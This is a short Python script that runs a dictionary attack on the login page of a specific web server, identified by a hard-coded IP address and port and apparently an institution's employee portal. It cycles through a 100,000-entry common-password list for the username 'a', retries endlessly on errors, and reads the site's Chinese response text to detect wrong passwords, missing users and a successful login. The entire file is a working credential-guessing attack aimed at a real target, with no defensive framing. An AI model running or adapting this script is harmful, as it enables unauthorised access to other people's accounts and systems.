import requests as r

with open('10-million-password-list-top-100000.txt','r') as dict:
    dict = dict.read()

dict = dict.split('\n')

# for i,d in enumerate(dict):
#     if d=='000000':
#         dict = dict[i:]
#         break
#
for i,d in enumerate(dict):
    if d=='debbie':
        dict = dict[i:]
        break

def trypass(un,pw):
    while 1:
        try:
            resp = r.request(
                'POST',
                'http://183.62.252.19:8997/yuangong/login.aspx?from=',
                data={
                    'action':'login',
                    'username':un,
                    'password':pw,
                },
                timeout=10,
            )
        except:
            continue
        else:
            break

    if '密码不正确' in resp.text:
        print(un,pw, 'wrong password')
        return 0
    elif '不存在' in resp.text:
        print(un,pw, 'no user')
        return 0
    elif '院务公开' in resp.text:
        print(un,pw, 'gotcha!')
        return 1
    else:
        print(un,pw, 'unknown error', resp.status_code, resp.text)
        return -1

for p in dict:
    k = trypass('a',p)
    if k == 1:
        break
